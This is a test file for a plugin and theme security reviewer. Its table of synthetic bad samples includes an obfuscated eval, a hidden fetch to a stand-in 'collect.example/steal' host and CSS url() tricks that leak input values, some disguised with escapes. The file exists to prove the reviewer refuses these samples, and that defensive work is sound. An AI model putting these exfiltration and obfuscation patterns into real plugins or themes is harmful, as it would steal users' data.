/**
 * Plan W11.S14 (research R6.10): every plugin and theme version is reviewed
 * before it is listed, with a scorecard. The bad examples here are synthetic
 * (written for this test, one per attack); the good ones are the registry's
 * real example plugins (public/plugins/examples).
 */
import { describe, expect, it } from "vitest";
import { readFileSync } from "node:fs";
import { spawnSync } from "node:child_process";
import { join, resolve } from "node:path";
import { cssRemoteLoads, isOpenSourceLicense, looksMinified, reviewPluginVersion, type ReviewInput } from "../plugins/runtime/review";
// @ts-expect-error — plain .mjs without types
import { inRange } from "../../scripts/audit-lock.mjs";

const ROOT = resolve(__dirname, "..", "..");
const knownBad = (JSON.parse(readFileSync(join(ROOT, "security/known-bad.json"), "utf8")) as { entries: Array<{ file: string }> }).entries.filter((e) => e.file.endsWith("package-lock.json")) as never;

const manifest = (over: Record<string, unknown> = {}) =>
  JSON.stringify({ schema: 1, id: "test.bad-example", name: "Bad example", version: "1.1.0", description: "synthetic", author: "test", license: "MIT", main: "main.js", capabilities: [{ id: "commands", reason: "a command" }], ...over });
const ok = `lumen.commands.register({ id: "hello", title: "Hello" }, () => "hi");\n`;
const review = (over: Partial<ReviewInput>) => reviewPluginVersion({ manifest: manifest(), main: ok, knownBad, inRange, now: Date.parse("2026-11-15T10:00:00Z"), ...over });

describe("bad examples are all refused", () => {
  const BAD: Array<[string, Partial<ReviewInput>, RegExp]> = [
    ["eval", { main: `eval("lumen.vault.read('x')");\n` }, /^eval$/],
    ["Function constructor", { main: `const f = new Function("return 1");\nf();\n` }, /^eval$/],
    ["obfuscated code (hex table + computed global)", { main: `var _0x1a2b=["\\x65\\x76\\x61\\x6c"];globalThis[_0x1a2b[0]]("1");\n` }, /^obfuscated-access$/],
    ["minified only, no source", { main: `var a=1;` + Array.from({ length: 400 }, (_, i) => `function f${i}(x){return x+${i}}`).join(";") + "\n" }, /^closed-source$/],
    ["undeclared network call", { main: `lumen.network.fetch("https://collect.example/steal");\n` }, /^undeclared-network$/],
    ["network call to an origin it didn't declare", { manifest: manifest({ capabilities: [{ id: "network:https://api.example", reason: "API" }] }), main: `lumen.network.fetch("https://other.example/x");\n` }, /^undeclared-network$/],
    ["CSS url() exfiltration", { css: { "theme.css": `input[value^="a"] { background: url(https://collect.example/?k=a); }\n` } }, /^css-remote$/],
    ["CSS @import from another origin", { css: { "theme.css": `@import "//cdn.collect.example/x.css";\n` } }, /^css-remote$/],
    ["CSS url() hidden with escapes", { css: { "theme.css": `a { background: u\\72l(ht\\74ps://collect.example/p); }\n` } }, /^css-remote$/],
    ["CSS image-set to another origin", { css: { "theme.css": `a { background-image: image-set("https://collect.example/a.png" 1x); }\n` } }, /^css-remote$/],
    ["closed licence", { manifest: manifest({ license: "Proprietary" }) }, /^closed-source$/],
    ["a known-bad dependency (high)", { lockfile: JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/nanoid": { version: "3.3.3" } } }) }, /^vulnerable-dependency$/],
  ];

  it.each(BAD)("%s", async (_name, over, rule) => {
    const card = await review(over);
    expect(card.passed).toBe(false);
    expect(card.grade).toBe("F");
    expect(card.score).toBe(0);
    expect(card.findings.filter((f) => f.severity === "error").map((f) => f.rule)).toEqual(expect.arrayContaining([expect.stringMatching(rule)]));
    // A failing version is delisted within 24 hours.
    expect(card.delistBy).toBe("2026-11-16T10:00:00.000Z");
  });

  it("refuses 100% of them (12/12)", async () => {
    const cards = await Promise.all(BAD.map(([, over]) => review(over)));
    expect(cards.filter((c) => !c.passed)).toHaveLength(BAD.length);
  });
});

describe("what passes, and what it reports", () => {
  it("a clean version passes with a scorecard", async () => {
    const card = await review({ css: { "theme.css": `@font-face { src: url("fonts/a.woff2"); } a { background: url(data:image/png;base64,AAAA); }\n` } });
    expect(card).toMatchObject({ scorecard: 1, id: "test.bad-example", version: "1.1.0", passed: true, delistBy: null, checks: { static: "pass", license: "pass", minified: "pass", css: "pass" } });
    expect(card.score).toBeGreaterThan(0);
    expect(card.scan.sha256).toMatch(/^[0-9a-f]{64}$/);
  });

  it("a build output passes when its readable source comes with it", async () => {
    const min = `var a=1;` + Array.from({ length: 400 }, (_, i) => `function f${i}(x){return x+${i}}`).join(";") + "\n";
    expect(looksMinified(min)).toBe(true);
    expect((await review({ main: min, source: "// readable\nfunction f0(x) {\n  return x;\n}\n" })).findings.map((f) => f.rule)).not.toContain("closed-source");
  });

  it("new permissions against the previous version are a warning a person approves", async () => {
    const card = await review({ previousManifest: manifest({ version: "1.0.0" }), manifest: manifest({ capabilities: [{ id: "commands", reason: "a command" }, { id: "vault:read", reason: "reads notes" }] }), main: `lumen.commands.register({ id: "x", title: "X" }, async () => lumen.vault.read("a.md"));\n` });
    expect(card.permissions.added).toEqual(["vault:read"]);
    expect(card.checks.permissions).toBe("warn");
    expect(card.findings).toContainEqual(expect.objectContaining({ rule: "permission-added", severity: "warning" }));
  });

  it("an allowed font origin passes; anything else is a remote load", () => {
    const css = `@import url("https://fonts.example/a.css"); a { src: url(//fonts.example/x.woff2) }`;
    expect(cssRemoteLoads(css, ["https://fonts.example"])).toEqual([]);
    expect(cssRemoteLoads(css).map((r) => r.target)).toEqual(["https://fonts.example/a.css", "//fonts.example/x.woff2"]);
    expect(cssRemoteLoads("/* url(https://x.example) */ a{}")).toEqual([]);
  });

  it("licences: open-source SPDX ids and expressions", () => {
    expect(isOpenSourceLicense("MIT")).toBe(true);
    expect(isOpenSourceLicense("(MIT OR Apache-2.0)")).toBe(true);
    expect(isOpenSourceLicense("GPL-2.0-or-later WITH Classpath-exception-2.0")).toBe(true);
    expect(isOpenSourceLicense("Proprietary")).toBe(false);
    expect(isOpenSourceLicense("MIT AND LicenseRef-Commercial")).toBe(false);
    expect(isOpenSourceLicense("")).toBe(false);
  });
});

describe("the registry run", () => {
  it("every real example version passes, each well under 10 minutes, and scorecards.json is current", () => {
    const r = spawnSync(process.execPath, ["scripts/plugins/review.mjs", "--check"], { cwd: ROOT, encoding: "utf8", timeout: 600_000 });
    expect(r.status, r.stdout + r.stderr).toBe(0);
    const times = [...r.stdout.matchAll(/ (\d+) ms /g)].map((m) => Number(m[1]));
    const cards = (JSON.parse(readFileSync(join(ROOT, "public/plugins/examples/scorecards.json"), "utf8")) as { cards: Array<{ passed: boolean }> }).cards;
    expect(times).toHaveLength(cards.length);
    expect(Math.max(...times)).toBeLessThan(10 * 60_000);
    expect(cards.every((c) => c.passed)).toBe(true);
  });
});
